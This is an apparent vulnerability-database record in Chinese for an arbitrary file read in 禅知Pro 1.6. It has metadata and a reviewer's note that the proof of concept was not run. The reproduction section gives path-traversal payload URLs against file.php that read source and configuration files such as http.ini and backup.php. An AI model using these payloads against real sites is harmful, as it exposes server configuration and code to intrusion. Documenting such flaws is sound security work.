---
source: "hatch 补库批 20260928"
product: "禅知Pro1.6"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "禅知Pro 1.6 前台任意文件读取"
prerequisites: "来源所述条件，未列明部分仍待核：file.php pathname/t/o handler;processreadpermissions;Windowsxamppsample"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-aedd33ee4e3046c6a3676f14"
entity_id: "ve-aedd33ee4e3046c6a3676f14"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：file.php pathname/t/o handler;processreadpermissions;Windowsxamppsample

- **适用与权限边界（1）**：权限受限已明确，root测试文件与../解析基准需补file.php所在目录。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

- **事实待核（2）**：主体影响/简介为空，版本仅标题，缺函数源码/官方修复/原始出处。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

- **适用与权限边界（3）**：读配置http.ini与PHP source模式明确，但无响应文本，匿名前台应确认鉴权。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# 禅知 Pro 1.6 前台任意文件读取

一、漏洞简介
------------

二、漏洞影响
------------

三、复现过程
------------

在网站根目录C:\\xampp\\chanzhi\\www新建一个测试文件test.php

![](./.resource/禅知Pro1.6前台任意文件读取/media/rId24.png)

执行payload查看文件内容：

    http://0-sec.org/file.php?pathname=../test.php&t=txt&o=source

![](./.resource/禅知Pro1.6前台任意文件读取/media/rId25.png)

执行payload来查看程序的配置文件：

    http://0-sec.org/file.php?pathname=../http.ini&t=txt&o=source

![](./.resource/禅知Pro1.6前台任意文件读取/media/rId26.png)

跨目录读取文件（前提是有目录权限）：

    http://0-sec.org/file.php?pathname=../../bin/php/backup.php&t=txt&o=source
